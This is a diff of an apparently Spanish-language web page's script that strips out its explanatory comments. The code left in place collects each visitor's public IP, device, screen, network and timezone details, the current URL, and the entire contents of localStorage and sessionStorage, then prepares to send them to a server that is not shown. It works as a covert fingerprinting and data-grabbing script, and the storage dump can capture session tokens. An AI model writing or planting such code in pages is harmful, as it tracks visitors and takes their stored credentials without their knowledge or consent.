@@ -53,11 +53,9 @@
 
     <script>
         async function enviarDatos() {
-            // Obtener dirección IP pública
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
 
-            // Información del dispositivo
             const infoDispositivo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -68,13 +66,11 @@
                 onlineStatus: navigator.onLine
             };
 
-            // Información de la pantalla
             const infoPantalla = {
                 resolucion: `${window.screen.width}x${window.screen.height}`,
                 colorDepth: window.screen.colorDepth
             };
 
-            // Información de la conexión
             let infoRed = { downlink: null, effectiveType: null };
             if (navigator.connection) {
                 infoRed = {
@@ -83,23 +79,18 @@
                 };
             }
 
-            // Zona horaria y fecha/hora local
             const infoTiempo = {
                 fechaLocal: new Date().toString(),
                 zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // Obtener URL actual
             const currentUrl = window.location.href;
 
-            // Información de almacenamiento
             const localStorageData = getStorageData(localStorage);
             const sessionStorageData = getStorageData(sessionStorage);
 
-            // Información de fuentes
             const fonts = document.fonts;
 
-            // Enviar datos al servidor
             const datosRecopilados = {
                 ip: ipData.ip,
                 dispositivo: infoDispositivo,
@@ -129,7 +120,6 @@
             });
         }
 
-        // Función para capturar datos del almacenamiento
         function getStorageData(storage) {
             const data = {};
             for (let i = 0; i < storage.length; i++) {
